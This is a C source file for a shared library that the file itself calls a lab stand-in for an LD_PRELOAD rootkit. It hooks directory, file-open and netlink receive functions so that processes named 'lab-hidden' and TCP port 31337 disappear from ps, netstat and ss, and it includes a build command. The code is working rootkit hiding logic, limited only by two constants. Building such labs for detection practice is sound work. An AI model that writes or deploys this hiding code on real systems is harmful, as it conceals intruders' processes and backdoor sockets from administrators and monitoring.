/*
 * hider.so: lab stand-in for a userland LD_PRELOAD rootkit. Inert: it only
 * filters what other programs read, and only two things:
 *
 *   - /proc/<pid> directory entries of processes whose comm is "lab-hidden"
 *     (readdir, readdir64);
 *   - lines for TCP port 31337 in /proc/net/tcp and /proc/net/tcp6 (open, open64,
 *     fopen, fopen64), and the same port in sock_diag replies (recvmsg), which is
 *     how ss lists sockets.
 *
 * It opens no sockets, writes nothing, changes nothing and calls nothing else.
 * Build: cc -shared -fPIC -O2 -o hider.so hider.c -ldl
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <ctype.h>
#include <dirent.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <linux/inet_diag.h>
#include <linux/netlink.h>
#include <linux/sock_diag.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>

#define HIDDEN_COMM "lab-hidden"
#define HIDDEN_PORT 31337
#define HIDDEN_PORT_HEX ":7A69"

static int is_net_tcp(const char *p) {
	return p && (strcmp(p, "/proc/net/tcp") == 0 || strcmp(p, "/proc/net/tcp6") == 0);
}

/* Read a small file with raw syscalls, so no wrapper below is involved. */
static ssize_t slurp(const char *path, char *buf, size_t n) {
	int fd = syscall(SYS_openat, AT_FDCWD, path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return -1;
	ssize_t got = 0, r;
	while ((size_t)got < n && (r = read(fd, buf + got, n - got)) > 0)
		got += r;
	close(fd);
	return got;
}

static int comm_is_hidden(const char *pid) {
	char path[64], comm[64];
	snprintf(path, sizeof path, "/proc/%s/comm", pid);
	ssize_t n = slurp(path, comm, sizeof comm - 1);
	if (n <= 0)
		return 0;
	comm[n] = 0;
	if (n > 0 && comm[n - 1] == '\n')
		comm[n - 1] = 0;
	return strcmp(comm, HIDDEN_COMM) == 0;
}

static int all_digits(const char *s) {
	if (!*s)
		return 0;
	for (; *s; s++)
		if (!isdigit((unsigned char)*s))
			return 0;
	return 1;
}

static int dir_is_proc(DIR *d) {
	char link[64], target[64];
	int fd = dirfd(d);
	if (fd < 0)
		return 0;
	snprintf(link, sizeof link, "/proc/self/fd/%d", fd);
	ssize_t n = readlink(link, target, sizeof target - 1);
	if (n < 0)
		return 0;
	target[n] = 0;
	return strcmp(target, "/proc") == 0;
}

struct dirent *readdir(DIR *d) {
	static struct dirent *(*real)(DIR *);
	if (!real)
		real = dlsym(RTLD_NEXT, "readdir");
	struct dirent *e;
	int proc = -1;
	while ((e = real(d)) != NULL) {
		if (!all_digits(e->d_name))
			return e;
		if (proc < 0)
			proc = dir_is_proc(d);
		if (!proc || !comm_is_hidden(e->d_name))
			return e;
	}
	return NULL;
}

struct dirent64 *readdir64(DIR *d) {
	static struct dirent64 *(*real)(DIR *);
	if (!real)
		real = dlsym(RTLD_NEXT, "readdir64");
	struct dirent64 *e;
	int proc = -1;
	while ((e = real(d)) != NULL) {
		if (!all_digits(e->d_name))
			return e;
		if (proc < 0)
			proc = dir_is_proc(d);
		if (!proc || !comm_is_hidden(e->d_name))
			return e;
	}
	return NULL;
}

/* A line of /proc/net/tcp*: "  sl: local_address rem_address ...". Hide it when
 * the local port is the hidden one. */
static int line_hidden(const char *line, size_t len) {
	const char *end = line + len;
	const char *p = memchr(line, ':', len); /* the "sl:" colon */
	if (!p)
		return 0;
	p++;
	while (p < end && *p == ' ')
		p++;
	const char *colon = memchr(p, ':', end - p); /* in local_address */
	if (!colon || colon + 5 > end)
		return 0;
	return strncasecmp(colon, HIDDEN_PORT_HEX, 5) == 0 && (colon + 5 == end || colon[5] == ' ');
}

/* Return a memfd holding the file's content without the hidden port's lines,
 * or -1 to fall back to the plain file. */
static int filtered_net_tcp(const char *path) {
	int src = syscall(SYS_openat, AT_FDCWD, path, O_RDONLY | O_CLOEXEC);
	if (src < 0)
		return -1;
	size_t cap = 1 << 16, len = 0;
	char *buf = malloc(cap);
	ssize_t r;
	while (buf && (r = read(src, buf + len, cap - len)) > 0) {
		len += r;
		if (len == cap) {
			char *nb = realloc(buf, cap *= 2);
			if (!nb) {
				free(buf);
				buf = NULL;
			} else
				buf = nb;
		}
	}
	close(src);
	if (!buf)
		return -1;
	int out = syscall(SYS_memfd_create, "net-tcp", 0);
	if (out < 0) {
		free(buf);
		return -1;
	}
	size_t i = 0;
	while (i < len) {
		char *nl = memchr(buf + i, '\n', len - i);
		size_t ll = nl ? (size_t)(nl - (buf + i)) + 1 : len - i;
		if (!line_hidden(buf + i, ll) && write(out, buf + i, ll) < 0)
			break;
		i += ll;
	}
	free(buf);
	lseek(out, 0, SEEK_SET);
	return out;
}

int open(const char *path, int flags, ...) {
	static int (*real)(const char *, int, ...);
	if (!real)
		real = dlsym(RTLD_NEXT, "open");
	mode_t mode = 0;
	if (flags & (O_CREAT | O_TMPFILE)) {
		va_list ap;
		va_start(ap, flags);
		mode = va_arg(ap, mode_t);
		va_end(ap);
	}
	if (is_net_tcp(path) && (flags & O_ACCMODE) == O_RDONLY) {
		int fd = filtered_net_tcp(path);
		if (fd >= 0)
			return fd;
	}
	return real(path, flags, mode);
}

int open64(const char *path, int flags, ...) {
	static int (*real)(const char *, int, ...);
	if (!real)
		real = dlsym(RTLD_NEXT, "open64");
	mode_t mode = 0;
	if (flags & (O_CREAT | O_TMPFILE)) {
		va_list ap;
		va_start(ap, flags);
		mode = va_arg(ap, mode_t);
		va_end(ap);
	}
	if (is_net_tcp(path) && (flags & O_ACCMODE) == O_RDONLY) {
		int fd = filtered_net_tcp(path);
		if (fd >= 0)
			return fd;
	}
	return real(path, flags, mode);
}

FILE *fopen(const char *path, const char *mode) {
	static FILE *(*real)(const char *, const char *);
	if (!real)
		real = dlsym(RTLD_NEXT, "fopen");
	if (is_net_tcp(path) && mode && mode[0] == 'r' && !strchr(mode, '+')) {
		int fd = filtered_net_tcp(path);
		if (fd >= 0) {
			FILE *f = fdopen(fd, "r");
			if (f)
				return f;
			close(fd);
		}
	}
	return real(path, mode);
}

FILE *fopen64(const char *path, const char *mode) {
	static FILE *(*real)(const char *, const char *);
	if (!real)
		real = dlsym(RTLD_NEXT, "fopen64");
	if (is_net_tcp(path) && mode && mode[0] == 'r' && !strchr(mode, '+')) {
		int fd = filtered_net_tcp(path);
		if (fd >= 0) {
			FILE *f = fdopen(fd, "r");
			if (f)
				return f;
			close(fd);
		}
	}
	return real(path, mode);
}

/* ss asks the kernel over netlink (sock_diag) and only reads /proc/net/tcp as a
 * fallback. Drop the hidden port's entries from sock_diag replies. */
ssize_t recvmsg(int fd, struct msghdr *msg, int flags) {
	static ssize_t (*real)(int, struct msghdr *, int);
	if (!real)
		real = dlsym(RTLD_NEXT, "recvmsg");
	ssize_t n = real(fd, msg, flags);
	if (n <= 0 || !msg || !msg->msg_iov || msg->msg_iovlen < 1 || (flags & MSG_PEEK))
		return n;
	struct sockaddr_nl *from = msg->msg_name;
	if (from && msg->msg_namelen >= sizeof *from && from->nl_family != AF_NETLINK)
		return n;
	char *base = msg->msg_iov[0].iov_base;
	if ((size_t)n > msg->msg_iov[0].iov_len)
		return n; /* truncated: leave it alone */
	size_t off = 0, keep = 0;
	int changed = 0;
	while (off + sizeof(struct nlmsghdr) <= (size_t)n) {
		struct nlmsghdr *h = (struct nlmsghdr *)(base + off);
		if (h->nlmsg_len < sizeof *h || off + h->nlmsg_len > (size_t)n)
			return n; /* not a netlink stream we understand: leave it alone */
		size_t step = NLMSG_ALIGN(h->nlmsg_len);
		if (step > (size_t)n - off)
			step = (size_t)n - off;
		int drop = 0;
		if (h->nlmsg_type == SOCK_DIAG_BY_FAMILY && h->nlmsg_len >= NLMSG_LENGTH(sizeof(struct inet_diag_msg))) {
			struct inet_diag_msg *m = NLMSG_DATA(h);
			drop = (m->id.idiag_sport == htons(HIDDEN_PORT));
		}
		if (drop)
			changed = 1;
		else {
			if (keep != off)
				memmove(base + keep, base + off, step);
			keep += step;
		}
		off += step;
	}
	return changed ? (ssize_t)keep : n;
}
